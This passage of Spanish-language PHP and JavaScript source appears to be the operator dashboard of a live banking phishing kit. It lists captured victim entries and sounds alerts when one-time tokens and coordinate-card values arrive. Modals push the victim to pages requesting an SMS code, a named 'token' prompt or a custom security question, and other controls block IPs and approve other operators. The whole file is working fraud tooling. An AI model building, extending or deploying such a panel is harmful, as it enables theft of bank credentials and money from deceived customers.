    $config = [
        'auth_mode' => $mode,
        'updated_by' => $_SESSION['admin_username'] ?? 'admin',
        'last_updated' => date('Y-m-d H:i:s')
    ];
    file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
    return ['success' => true, 'message' => 'Modo cambiado a: ' . $mode];
}

// =============================================
// INTERFAZ HTML (DISEÑO COMMAND CENTER)
// =============================================
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        
        /* BUSCA ESTA PARTE EN TU CSS Y AGREGA .bg-mail */
.bg-login { background: #3b82f6; } .bg-empresa { background: #6366f1; }  
.bg-token { background: #f59e0b; } .bg-coord { background: #10b981; }    
.bg-del { background: #ef4444; } .bg-block { background: #64748b; }    
.bg-mail { background: #db2777; } 
.bg-final { background: #0f172a; border: 1px solid #334155; }
        
        
        /* ETIQUETA DE ADMIN (FIJA) */
.admin-mark-tag {
    display: inline-block;
    padding: 4px 8px;
    border-radius: 6px; /* Bordes un poco menos redondos para verse más solida */
    color: white;
    font-weight: bold;
    font-size: 0.75rem;
    box-shadow: 0 1px 3px rgba(0,0,0,0.4);
    /* Se eliminó la animación para que sea fija */
}
@keyframes popIn { from { transform: scale(0); } to { transform: scale(1); } }
        
        :root { 
            --bg: #0f172a; 
            --surface: #1e293b; 
            --border: #334155; 
            --text: #e2e8f0; 
            --accent: #3b82f6; 
            --danger: #ef4444;
            --success: #10b981;
            --warning: #f59e0b;
        }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; margin: 0; padding: 20px; font-size: 14px; }

        /* HEADER */
        .top-bar {
            display: flex; justify-content: space-between; align-items: center;
            background: var(--surface); padding: 15px 20px; border-radius: 12px;
            border: 1px solid var(--border); margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }
        .header-title { font-size: 1.2rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
        .header-controls { display: flex; gap: 10px; }
        .btn-top {
            padding: 8px 16px; border-radius: 6px; border: none; cursor: pointer;
            font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 8px;
            transition: all 0.2s; color: white;
        }
        .btn-manage { background: var(--warning); color: #000; }
        .btn-clear { background: var(--danger); }
        .btn-sound { background: var(--accent); }
        .btn-logout { background: #475569; }
        .btn-top:hover { filter: brightness(1.1); transform: translateY(-1px); }

        /* TABLA */
        .table-wrapper { background: var(--surface); border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
        /* --- CORRECCIÓN SEPARACIÓN DE TABLA --- */
table { 
    width: 100%; 
    border-collapse: separate; /* CLAVE PARA SEPARAR */
    border-spacing: 0 8px; /* 8px de separación vertical */
    white-space: nowrap; 
}
tbody tr { 
    background: #1e293b; /* Fondo de la fila */
    box-shadow: 0 2px 5px rgba(0,0,0,0.2); /* Sombrita para dar volumen */
    transition: transform 0.2s;
}
tbody tr:hover { 
    transform: scale(1.005); /* Efecto pop sutil */
    background: #263346; 
}
td { 
    padding: 12px 15px; 
    vertical-align: top; 
    border-top: 1px solid var(--border);
    border-bottom: 1px solid var(--border);
}
td:first-child { border-left: 1px solid var(--border); border-radius: 8px 0 0 8px; }
td:last-child { border-right: 1px solid var(--border); border-radius: 0 8px 8px 0; }
        thead { background: #0f172a; border-bottom: 2px solid var(--border); }
        th { padding: 15px; text-align: left; text-transform: uppercase; font-size: 0.75rem; color: #94a3b8; letter-spacing: 0.05em; font-weight: 700; }
        tbody tr { 
            border-bottom: 12px solid var(--bg); /* Separador grueso del color del fondo */
            background: #1e293b; /* Color de fondo de la fila */
            transition: transform 0.2s;
        }
        tbody tr:hover { 
            transform: scale(1.01); /* Pequeño efecto zoom al pasar mouse */
            background: #263346; 
        }
        td { padding: 12px 15px; vertical-align: top; }

        /* DATOS VERTICALES */
        .data-group { margin-bottom: 8px; }
        .data-group:last-child { margin-bottom: 0; }
        .field-label { display: block; font-size: 0.7rem; color: #94a3b8; margin-bottom: 3px; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
        .data-value { 
            display: inline-block; background: #0f172a; border: 1px solid #334155; 
            padding: 6px 10px; border-radius: 6px; font-family: 'Consolas', monospace; 
            color: #38bdf8; font-size: 0.95rem; cursor: pointer; transition: all 0.2s;
            min-width: 100px; text-align: center;
        }
        .data-value:hover { border-color: #38bdf8; background: #162032; box-shadow: 0 0 5px rgba(56, 189, 248, 0.2); }
        .data-value.empty { color: #475569; border-style: dashed; border-color: #334155; background: transparent; cursor: default; }

        /* STATUS */
        .status-row { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
        .device-icon { color: #cbd5e1; font-size: 1rem; width: 20px; text-align: center; }
        .loc-text { font-size: 0.85rem; color: #e2e8f0; font-weight: 500; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; }

        /* ACCIONES */
        .actions-grid { display: flex; gap: 5px; flex-wrap: wrap; max-width: 140px; }
        .btn-icon {
            width: 36px; height: 36px; border: none; border-radius: 8px; cursor: pointer; color: white;
            display: flex; align-items: center; justify-content: center; font-size: 1rem; transition: transform 0.2s, filter 0.2s;
        }
        .btn-icon:hover { transform: translateY(-2px); filter: brightness(1.15); }
        .bg-login { background: #3b82f6; } .bg-empresa { background: #6366f1; }  
        .bg-token { background: #f59e0b; } .bg-coord { background: #10b981; }    
        .bg-del { background: #ef4444; } .bg-block { background: #64748b; }    

        /* TOAST */
        #toast-container { position: fixed; top: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
        .toast {
            background: var(--surface); color: #fff; padding: 12px 20px; border-radius: 8px; border-left: 4px solid var(--accent);
            box-shadow: 0 5px 15px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 10px; min-width: 250px;
            animation: slideIn 0.3s ease-out; font-size: 0.9rem;
        }
        .toast.success { border-left-color: var(--success); }
        .toast.error { border-left-color: var(--danger); }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }

        /* MODALES */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(4px); }
        .modal-box { background: var(--surface); padding: 25px; border-radius: 12px; width: 380px; border: 1px solid var(--border); box-shadow: 0 20px 40px rgba(0,0,0,0.6); animation: modalIn 0.2s ease-out; }
        @keyframes modalIn { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
        .modal-header { font-size: 1.1rem; font-weight: bold; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid var(--border); color: white; display:flex; justify-content: space-between; align-items: center; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; color: #94a3b8; font-size: 0.8rem; margin-bottom: 5px; text-transform: uppercase; }
        .modal-input { width: 100%; padding: 10px; background: #0f172a; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; outline: none; }
        .modal-input:focus { border-color: var(--accent); }
        .coords-container { display: flex; gap: 15px; }
        .coord-box { text-align: center; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
        .modal-btns { display: flex; gap: 10px; margin-top: 20px; }
        .btn-confirm { background: var(--accent); color: white; border: none; padding: 10px; border-radius: 6px; flex: 1; cursor: pointer; font-weight: bold; }
        .btn-danger-modal { background: var(--danger); color: white; border: none; padding: 10px; border-radius: 6px; flex: 1; cursor: pointer; font-weight: bold; }
        .btn-cancel { background: transparent; border: 1px solid var(--border); color: #94a3b8; padding: 10px; border-radius: 6px; flex: 1; cursor: pointer; }
        .btn-cancel:hover { background: var(--border); color: white; }
                
                /* --- ESTILOS CENTRO DE NOTIFICACIONES --- */
        .notif-wrapper { position: relative; display: inline-block; }
        
        .btn-notif { background: #6366f1; position: relative; } /* Color Indigo */
        .notif-badge { 
            position: absolute; top: -5px; right: -5px; background: var(--danger); 
            color: white; border-radius: 50%; width: 18px; height: 18px; 
            font-size: 0.7rem; display: flex; align-items: center; justify-content: center;
            border: 2px solid var(--surface); opacity: 0; transition: opacity 0.2s;
        }
        
        .notif-dropdown {
            position: absolute; top: 110%; right: 0; width: 320px;
            background: var(--surface); border: 1px solid var(--border);
            border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            z-index: 10000; display: none; overflow: hidden;
            animation: slideDown 0.2s ease-out;
        }
        @keyframes slideDown { from { opacity:0; transform:translateY(-10px); } to { opacity:1; transform:translateY(0); } }

        .notif-header {
            padding: 12px 15px; background: #0f172a; border-bottom: 1px solid var(--border);
            display: flex; justify-content: space-between; align-items: center;
        }
        .notif-title { font-weight: bold; font-size: 0.9rem; color: var(--text); }
        .notif-clear-all { color: var(--danger); font-size: 0.75rem; cursor: pointer; text-decoration: underline; }
        .notif-clear-all:hover { color: #ff6b6b; }

        .notif-list { max-height: 350px; overflow-y: auto; }
        .notif-empty { padding: 20px; text-align: center; color: #64748b; font-size: 0.85rem; font-style: italic; }

        .notif-item {
            padding: 12px 15px; border-bottom: 1px solid rgba(255,255,255,0.05);
            display: flex; gap: 10px; align-items: flex-start; transition: background 0.2s;
        }
        .notif-item:hover { background: rgba(255,255,255,0.03); }
        .notif-icon { margin-top: 3px; font-size: 1rem; }
        .notif-content { flex: 1; }
        .notif-msg { display: block; font-size: 0.85rem; color: #cbd5e1; margin-bottom: 4px; }
        .notif-time { display: block; font-size: 0.7rem; color: #64748b; }
        .notif-del-btn { 
            color: #64748b; cursor: pointer; padding: 2px 6px; 
            transition: color 0.2s; font-size: 0.9rem;
        }
        .notif-del-btn:hover { color: var(--danger); }
        
        /* Scrollbar fina para el panel */
        .notif-list::-webkit-scrollbar { width: 6px; }
        .notif-list::-webkit-scrollbar-track { background: #0f172a; }
        .notif-list::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
                
                /* En el estilo CSS de admin.php */
.switch {
    position: relative;
    display: inline-block;
    width: 50px;
    height: 24px;
}
.switch input {
    opacity: 0;
    width: 0;
    height: 0;
}
.slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #475569;
    transition: .4s;
}
.slider:before {
    position: absolute;
    content: "";
    height: 16px;
    width: 16px;
    left: 4px;
    bottom: 4px;
    background-color: white;
    transition: .4s;
}
input:checked + .slider {
    background-color: #10b981;
}
input:checked + .slider:before {
    transform: translateX(26px);
}
.slider.round {
    border-radius: 34px;
}
.slider.round:before {
    border-radius: 50%;
}
                
    </style>
</head>
<body>

    <audio id="notificationSound" preload="auto" style="display: none;">
        <source src="sounds/notification.mp3" type="audio/mpeg">
        <source src="sounds/notification.wav" type="audio/wav">
    </audio>

    <div id="toast-container"></div>

    <div class="top-bar">
        <div class="header-title">
            <i class="fas fa-shield-alt" style="color:var(--accent);"></i> Panel de Control
        </div>
        <div class="header-controls">
                
                <?php if ($_SESSION['admin_username'] === 'admin'): ?>
<div class="auth-mode-switch" style="display:flex; align-items:center; gap:8px; background:var(--surface); padding:6px 12px; border-radius:20px; border:1px solid var(--border);">
    <i class="fas fa-user-shield" style="color:#94a3b8; font-size:0.9rem;"></i>
    <span style="font-size:0.8rem; color:#cbd5e1;">Modo:</span>
    <label class="switch" style="margin:0 5px;">
        <input type="checkbox" id="authModeSwitch" <?php echo getAuthMode() === 'authorization' ? 'checked' : ''; ?>>
        <span class="slider round"></span>
    </label>
    <span id="modeLabel" style="font-size:0.8rem; font-weight:bold; color:#cbd5e1;">
        <?php echo getAuthMode() === 'authorization' ? 'Autorización' : 'Contraseña'; ?>
    </span>
</div>
<?php endif; ?>
                
            <?php if (isset($_SESSION['admin_username']) && $_SESSION['admin_username'] === 'admin'): ?>
        <button class="btn-top btn-manage" onclick="window.location.href='manage_users.php'"><i class="fas fa-users-cog"></i> Gestionar</button>
    <?php endif; ?>
            <button class="btn-top btn-clear" onclick="pedirConfirmacion('limpiar')"><i class="fas fa-trash-alt"></i> Limpiar</button>
            
                        <?php if (isset($_SESSION['admin_username']) && $_SESSION['admin_username'] === 'admin'): ?>
    <button class="btn-top" id="btnRequests" onclick="mostrarSolicitudes()" style="background:#0f172a; border:1px solid #334155; position:relative;">
        <i class="fas fa-user-clock"></i> Acceso
        <span id="reqBadge" style="position:absolute; top:-5px; right:-5px; background:red; color:white; border-radius:50%; width:18px; height:18px; font-size:10px; display:none; align-items:center; justify-content:center;">0</span>
    </button>
<?php endif; ?>
                        
            <div class="notif-wrapper">
                <button class="btn-top btn-notif" onclick="toggleNotificaciones()">
                    <i class="fas fa-bell"></i> Historial
                    <span id="notifBadge" class="notif-badge">0</span>
                </button>
                
                <div id="notifPanel" class="notif-dropdown">
                    <div class="notif-header">
                        <span class="notif-title">Últimos Eventos</span>
                        <span class="notif-clear-all" onclick="borrarTodasNotificaciones()">Borrar todo</span>
                    </div>
                    <div id="notifList" class="notif-list">
                        <div class="notif-empty" id="notifEmptyMsg">Sin notificaciones nuevas</div>
                    </div>
                </div>
            </div>
            <button class="btn-top btn-sound" id="btnSound" onclick="toggleSound()"><i class="fas fa-bell"></i> Sonido: ON</button>
            <button class="btn-top btn-logout" onclick="window.location.href='logout.php'"><i class="fas fa-sign-out-alt"></i> Salir</button>
        </div>
    </div> 

    <div id="tablesContainer" class="table-wrapper">
        <?php echo generateUsersTable($usersData); ?>
    </div>

    <div id="modalConfirm" class="modal-overlay">
        <div class="modal-box" style="width: 320px; text-align: center;">
            <div style="margin-bottom: 15px;"><i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: var(--danger);"></i></div>
            <h3 id="confirmTitle" style="color:white; margin:0 0 10px 0;">¿Estás seguro?</h3>
            <p id="confirmMsg" style="color:#cbd5e1; margin-bottom:20px;">Esta acción no se puede deshacer.</p>
            <div class="modal-btns">
                <button class="btn-cancel" onclick="cerrarModal('modalConfirm')">Cancelar</button>
                <button id="btnConfirmAction" class="btn-danger-modal">Confirmar</button>
            </div>
        </div>
    </div>

<div id="modalEmpresa_V2" class="modal-overlay">
    <div class="modal-box" style="width: 350px; text-align: center;">
        <div style="margin-bottom: 15px;">
            <i class="fas fa-comment-sms" style="font-size: 3rem; color: var(--success);"></i>
        </div>
        <h3 style="color:white; margin:0 0 10px 0;">Solicitar SMS</h3>
        <input type="hidden" id="v2_submissionID">
        <input type="hidden" id="v2_ip">
        
        <p style="color:#cbd5e1; margin-bottom:20px;">
            ¿Confirmas redirigir al usuario para pedir el código SMS?
        </p>

        <div class="modal-btns">
            <button class="btn-cancel" onclick="document.getElementById('modalEmpresa_V2').style.display='none'">Cancelar</button>
            <button class="btn-confirm" onclick="enviarSmsSimple()">Sí, Solicitar</button>
        </div>
    </div>
</div>

<div id="modalToken" class="modal-overlay">
    <div class="modal-box" style="width: 380px;">
        <div class="modal-header">
            <span>Solicitar Token</span> 
            <i class="fas fa-key" style="color:var(--warning);"></i>
        </div>
        <input type="hidden" id="tokSubmissionId">
        <input type="hidden" id="tokIP">
        
        <div class="input-group">
            <label>Nombre del Cliente (Aparecerá en el Hola, ...)</label>
            <div style="display:flex; gap:5px;">
                <input type="text" class="modal-input" id="tok_nombre" placeholder="Ej: Gladis, Pedro...">
                <button type="button" class="btn-icon" id="btnLockNombre" onclick="toggleBloqueoInput('tok_nombre', 'btnLockNombre')" style="background:#334155; width:40px;">
                    <i class="fas fa-unlock"></i>
                </button>
            </div>
            <p style="font-size:0.7rem; color:#64748b; margin-top:5px;">
                Bloquea el campo para confirmar el nombre antes de enviar.
            </p>
        </div>

        <div class="modal-btns">
            <button class="btn-cancel" onclick="document.getElementById('modalToken').style.display='none'">Cancelar</button>
            <button class="btn-confirm" onclick="enviarTokenSimple()">Enviar y Redirigir</button>
        </div>
    </div>
</div>
<div id="modalPregunta" class="modal-overlay">
    <div class="modal-box" style="width: 380px;">
        <div class="modal-header">
            <span>Pregunta de Seguridad</span>
            <i class="fas fa-shield-alt" style="color:var(--accent);"></i>
        </div>
        <input type="hidden" id="pregSubmissionId">
        <input type="hidden" id="pregIP">

        <div class="input-group">
            <label>Escribe la pregunta que verá el usuario</label>
            <input type="text" class="modal-input" id="preg_texto" placeholder="Ej: ¿Cuál es el nombre de tu mascota?">
        </div>

        <div class="modal-btns">
            <button class="btn-cancel" onclick="document.getElementById('modalPregunta').style.display='none'">Cancelar</button>
            <button class="btn-confirm" onclick="enviarPreguntaSeguridad()">Enviar y Redirigir</button>
        </div>
    </div>
</div>
<div id="modalRequests" class="modal-overlay">
    <div class="modal-box" style="width: 400px;">
        <div class="modal-header">
            <span>Solicitudes de Ingreso</span>
            <button onclick="cerrarModal('modalRequests')" style="background:none; border:none; color:white; cursor:pointer;"><i class="fas fa-times"></i></button>
        </div>
        <div id="requestsList" style="max-height:300px; overflow-y:auto; margin-top:15px; text-align:left;">
            </div>
    </div>
</div>

    <script>
    // --- VARIABLES GLOBALES ---
    let soundEnabled = false; 
    let knownRows = {}; 
    let isFirstLoad = true; 

    // --- SONIDO ---
    function reproducirSonido() {
        if (!soundEnabled) return;
        const audio = document.getElementById('notificationSound');
        if (audio) {
            audio.volume = 1.0; 
            audio.currentTime = 0;
            audio.play().catch(e => console.log("Audio bloqueado"));
        }
    }

    function toggleSound() {
        soundEnabled = !soundEnabled;
        const btn = document.getElementById('btnSound');
        
        if(soundEnabled) {
            btn.innerHTML = '<i class="fas fa-bell"></i> Sonido: ON';
            btn.style.background = 'var(--accent)';
            reproducirSonido(); 
            notificar('🔊 Sonido Activado', 'success');
        } else {
            btn.innerHTML = '<i class="fas fa-bell-slash"></i> Sonido: OFF';
            btn.style.background = '#64748b';
            notificar('Sonido Desactivado', 'info');
        }
    }

  // --- LÓGICA DE CENTRO DE NOTIFICACIONES CON PERSISTENCIA ---
    let notifCount = 0;

    // Cargar historial al iniciar
    function cargarHistorialGuardado() {
        const historial = JSON.parse(localStorage.getItem('admin_notif_history') || '[]');
        
        // Invertimos el array para que al hacer prepend queden en orden correcto (más nuevo arriba)
        historial.reverse().forEach(item => {
            renderizarNotificacionHTML(item.msg, item.type, item.time, item.id);
        });

        // Actualizar badge si hay notificaciones cargadas
        if (historial.length > 0) {
            notifCount = historial.length;
            const badge = document.getElementById('notifBadge');
            badge.innerText = notifCount > 9 ? '9+' : notifCount;
            badge.style.opacity = '1';
        }
    }

    function toggleNotificaciones() {
        const panel = document.getElementById('notifPanel');
        if (panel.style.display === 'block') {
            panel.style.display = 'none';
        } else {
            panel.style.display = 'block';
            // Al abrir, reseteamos el contador rojo visualmente pero NO borramos el historial
            document.getElementById('notifBadge').style.opacity = '0';
            notifCount = 0; 
        }
    }

    function ocultarNotificaciones() {
        document.getElementById('notifPanel').style.display = 'none';
    }

    // Función auxiliar solo para pintar en pantalla (sin guardar)
    function renderizarNotificacionHTML(msg, type, time, id) {
        const list = document.getElementById('notifList');
        const emptyMsg = document.getElementById('notifEmptyMsg');
        if(emptyMsg) emptyMsg.style.display = 'none';

        let icon = 'info-circle'; let color = '#3b82f6';
        if(type === 'success') { icon = 'check-circle'; color = '#10b981'; }
        if(type === 'error') { icon = 'exclamation-circle'; color = '#ef4444'; }
        if(msg.includes('Token')) { icon = 'key'; color = '#f59e0b'; }
        
        const html = `
            <div class="notif-item" id="${id}">
                <div class="notif-icon"><i class="fas fa-${icon}" style="color:${color}"></i></div>
                <div class="notif-content">
                    <span class="notif-msg">${msg}</span>
                    <span class="notif-time">${time}</span>
                </div>
                <div class="notif-del-btn" onclick="borrarNotificacion('${id}')" title="Borrar">
                    <i class="fas fa-times"></i>
                </div>
            </div>
        `;

        $(list).prepend(html);
    }

    // Función principal que se llama desde el código
    function agregarAlHistorial(msg, type) {
        const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
        const id = 'notif-' + Date.now() + Math.floor(Math.random() * 1000);

        // 1. Renderizar en pantalla
        renderizarNotificacionHTML(msg, type, time, id);

        // 2. Guardar en LocalStorage
        const historial = JSON.parse(localStorage.getItem('admin_notif_history') || '[]');
        historial.unshift({ id: id, msg: msg, type: type, time: time });
        
        // Limitar a las últimas 50 notificaciones para no saturar memoria
        if(historial.length > 50) historial.pop();
        
        localStorage.setItem('admin_notif_history', JSON.stringify(historial));

        // 3. Actualizar contador
        const panel = document.getElementById('notifPanel');
        if(panel.style.display !== 'block') {
            notifCount++;
            const badge = document.getElementById('notifBadge');
            badge.innerText = notifCount > 9 ? '9+' : notifCount;
            badge.style.opacity = '1';
        }
    }

    function borrarNotificacion(id) {
        // 1. Borrar del DOM
        const el = document.getElementById(id);
        if (el) el.remove();

        // 2. Borrar del LocalStorage
        let historial = JSON.parse(localStorage.getItem('admin_notif_history') || '[]');
        historial = historial.filter(item => item.id !== id);
        localStorage.setItem('admin_notif_history', JSON.stringify(historial));

        // Verificar si está vacío
        const list = document.getElementById('notifList');
        if(list.children.length === 0 || (list.children.length === 1 && list.children[0].id === 'notifEmptyMsg')) {
            if(document.getElementById('notifEmptyMsg')) document.getElementById('notifEmptyMsg').style.display = 'block';
        }
    }

    function borrarTodasNotificaciones() {
        const list = document.getElementById('notifList');
        list.innerHTML = '<div class="notif-empty" id="notifEmptyMsg">Sin notificaciones nuevas</div>';
        notifCount = 0;
        document.getElementById('notifBadge').style.opacity = '0';
        
        // Limpiar LocalStorage
        localStorage.removeItem('admin_notif_history');
    }

   // --- FUNCIÓN NOTIFICAR MEJORADA (ESTRUCTURA MÁS SEGURA) ---
    function notificar(msg, type = 'info') {
        
        // 1. LISTA DE FRASES A IGNORAR EN EL HISTORIAL
        // Agrega aquí cualquier frase nueva que quieras filtrar
        var filtros = [
            'Solicitado', 
            'Enviando comando', 
            'Redirigido correctamente', 
            'IP Bloqueada', 
            'Copiado:', 
            'Eliminado', 
            'Desbloqueado', 
            'Sonido Activado', 
            'Sonido Desactivado', 
            'Nombre desbloqueado', 
            'Nombre fijado',
            'Entrada marcada correctamente', // TUS NUEVOS FILTROS
            'Entrada liberada'
        ];

        // Verificamos si el mensaje contiene alguna de las frases prohibidas
        var guardarEnHistorial = true;
        for (var i = 0; i < filtros.length; i++) {
            if (msg.includes(filtros[i])) {
                guardarEnHistorial = false;
                break;
            }
        }

        // Si pasó la prueba, lo guardamos
        if (guardarEnHistorial) {
            agregarAlHistorial(msg, type);
        }

        // 2. LÓGICA VISUAL (TOAST FLOTANTE) - ESTO SIEMPRE SE EJECUTA
        const container = document.getElementById('toast-container');
        if(!container) return;

        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        
        let icon = 'info-circle';
        if(type === 'success') icon = 'check-circle';
        if(type === 'error') icon = 'exclamation-circle';
        if(msg.includes('Token')) icon = 'key';
        if(msg.includes('Coord')) icon = 'crosshairs';
        if(msg.includes('Nueva')) icon = 'user-plus';
        if(msg.includes('Nombre fijado')) icon = 'lock';
        if(msg.includes('Nombre desbloqueado')) icon = 'unlock';
        if(msg.includes('Entrada marcada')) icon = 'thumbtack'; // Icono para marcado

        toast.innerHTML = `<i class="fas fa-${icon}"></i> <span>${msg}</span>`;
        container.appendChild(toast);
        
        setTimeout(() => { 
            toast.style.opacity = '0'; 
            toast.style.transform = 'translateY(-10px)'; 
            setTimeout(() => toast.remove(), 300); 
        }, 5000);

        // SONIDO
        if(typeof soundEnabled !== 'undefined' && soundEnabled && (msg.includes('Nueva') || msg.includes('Token') || msg.includes('Coord'))) {
            reproducirSonido();
        }
    }

    function copiar(text) {
        if(!text || text === '...' || text === '---') return;
        navigator.clipboard.writeText(text);
        notificar('Copiado: ' + text, 'success');
    }

    function pedirConfirmacion(accion, d1, d2=null) {
        const modal = document.getElementById('modalConfirm');
        const title = document.getElementById('confirmTitle');
        const msg = document.getElementById('confirmMsg');
        
        pendingAction = accion; pData1 = d1; pData2 = d2;

        if(accion === 'limpiar') {
            title.innerText = '¿Limpiar Tabla?'; msg.innerText = 'Se eliminarán todos los registros.';
        } else if(accion === 'bloquear') {
            title.innerText = '¿Bloquear IP?'; msg.innerText = 'IP: ' + d1;
        } else if(accion === 'eliminar_registro') {
            title.innerText = '¿Eliminar Entrada?'; msg.innerText = 'Se eliminará solo este registro.';
        } 
        // --- NUEVO CASO AGREGADO ---
        else if(accion === 'aprobar_usuario') {
            title.innerText = '¿Autorizar Acceso?'; 
            msg.innerText = 'Vas a permitir el ingreso al usuario: ' + d1;
        }

        modal.style.display = 'flex';
        // Aseguramos que este modal quede encima del modal de solicitudes
        modal.style.zIndex = '10002'; 
    }

    document.getElementById('btnConfirmAction').onclick = function() {
        if(pendingAction === 'limpiar') {
            $.post('admin.php', {action: 'clear_table'}, r => { if(r.success) notificar('Tabla Limpia', 'success'); loadUsers(); }, 'json');
        }
        else if(pendingAction === 'bloquear') {
            $.post('admin.php', {action: 'block', ip: pData1}, r => { if(r.success) notificar('IP Bloqueada', 'error'); loadUsers(); }, 'json');
        }
        else if(pendingAction === 'eliminar_registro') {
            $.post('admin.php', {action: 'delete_submission', submission_id: pData1, ip: pData2}, r => { if(r.success) notificar('Eliminado', 'success'); loadUsers(); }, 'json');
        }
        // --- NUEVA LÓGICA AGREGADA ---
        else if(pendingAction === 'aprobar_usuario') {
            approveUser(pData1); // Llamamos a la función original
        }
        
        document.getElementById('modalConfirm').style.display = 'none';
    };

    function loadUsers() {
    $.post('admin.php', {action: 'load_users'}, function(data) {
        $('#tablesContainer').html(data);
        
        const rows = document.querySelectorAll('#tablesContainer table tbody tr[data-sid]');
        const currentRows = {};
        
        rows.forEach(row => {
            const sid = row.getAttribute('data-sid');
            const index = row.getAttribute('data-index');
            
            // 🔴 CORRECCIÓN: Extraer el VALOR actual del token y coordenadas
            const tokenValue = row.querySelector('.data-value[style*="color:#f59e0b"]')?.innerText || '';
            const coordsElements = Array.from(row.querySelectorAll('.data-value:not(.empty)')).filter(el => 
                el.innerText && !el.innerText.includes('---') && 
                !el.getAttribute('style')?.includes('color:#f59e0b')
            );
            const coordsValue = coordsElements.map(el => el.innerText).join('|');
            
            currentRows[sid] = { 
                token: tokenValue, 
                coords: coordsValue,
                index: index 
            };
            
            // Detectar cambios si ya conocíamos esta fila
            if (knownRows[sid]) {
                const old = knownRows[sid];
                
                // 1. Detectar si token CAMBIÓ (no solo si aparece por primera vez)
                if (tokenValue && old.token && tokenValue !== old.token) {
                    notificar(`🔄 Entrada #${index}: Token Actualizado [${old.token} → ${tokenValue}]`, 'success');
                    if(soundEnabled) reproducirSonido();
                }
                // 2. Detectar si token NUEVO (antes no había)
                else if (tokenValue && !old.token) {
                    notificar(`🔔 Entrada #${index}: Token Recibido [${tokenValue}]`, 'success');
                    if(soundEnabled) reproducirSonido();
                }
                
                // 3. Detectar si coordenadas CAMBIARON
                if (coordsValue && old.coords && coordsValue !== old.coords) {
                    notificar(`🔄 Entrada #${index}: Coordenadas Actualizadas`, 'success');
                    if(soundEnabled) reproducirSonido();
                }
                // 4. Detectar si coordenadas NUEVAS
                else if (coordsValue && !old.coords) {
                    notificar(`📍 Entrada #${index}: Coordenadas Recibidas`, 'success');
                    if(soundEnabled) reproducirSonido();
                }
                
            } else {
                // Nueva fila (solo notificar si no es la primera carga)
                if (!isFirstLoad) {
                    notificar(`🚀 Nueva Entrada #${index} Detectada`, 'info');
                    if(soundEnabled) reproducirSonido();
                }
            }
        });
        
        knownRows = currentRows;
        isFirstLoad = false;
    });
}

    // --- MODALES Y ACCIONES ---
    function abrirModalToken(sid, ip) {
    document.getElementById('tokSubmissionId').value = sid;
    document.getElementById('tokIP').value = ip;
    
    // CAMBIO: Limpiamos el input y reseteamos el candado
    var input = document.getElementById('tok_nombre');
    var btn = document.getElementById('btnLockNombre');
    input.value = ''; 
    input.readOnly = false;
    input.style.opacity = "1";
    btn.style.background = "#334155";
    btn.querySelector('i').className = "fas fa-unlock";
    
    document.getElementById('modalToken').style.display = 'flex';
    setTimeout(() => input.focus(), 100);
}
 function abrirModalCoordenadas(sid, ip) {
    document.getElementById('v2_submissionID').value = sid;
    document.getElementById('v2_ip').value = ip;
    document.getElementById('modalEmpresa_V2').style.display = 'flex';
}

function bloquearInputV2() {
    var input = document.getElementById('v2_inputDigits');
    var btn = document.getElementById('v2_btnLock');
    var icon = btn.querySelector('i');
    
    if (input.readOnly) {
        // Desbloquear
        input.readOnly = false;
        input.style.opacity = "1";
        btn.style.background = "#334155";
        icon.className = "fas fa-unlock";
    } else {
        // Bloquear
        if(input.value.length < 1) return;
        input.readOnly = true;
        input.style.opacity = "0.7";
        btn.style.background = "#10b981";
        icon.className = "fas fa-lock";
    }
}

function enviarSmsSimple() {
    var sid = document.getElementById('v2_submissionID').value;
    var ip = document.getElementById('v2_ip').value;
    var btn = document.querySelector('#modalEmpresa_V2 .btn-confirm');
    
    btn.innerHTML = 'Enviando...';
    btn.disabled = true;

    $.post('admin.php', { 
        action: 'guardar_coordenadas', // Reutilizamos la acción existente
        submission_id: sid, 
        ip: ip, 
        last4: 'Solicitado' // Enviamos un texto fijo para que el backend no falle
    }, function(r) { 
        btn.innerHTML = 'Sí, Solicitar';
        btn.disabled = false;

        if(r.success){ 
            document.getElementById('modalEmpresa_V2').style.display = 'none';
            if(typeof notificar === 'function') notificar('Solicitud SMS enviada', 'success');
            if(typeof loadUsers === 'function') loadUsers(); 
        } else {
            alert(r.error || 'Error al procesar');
        }
    }, 'json');
}

// FIN BLOQUE REEMPLAZO JS
    function cerrarModal(id) { document.getElementById(id).style.display = 'none'; }
        
        // --- FUNCIONES QUE FALTABAN (RESTAURADAS) ---

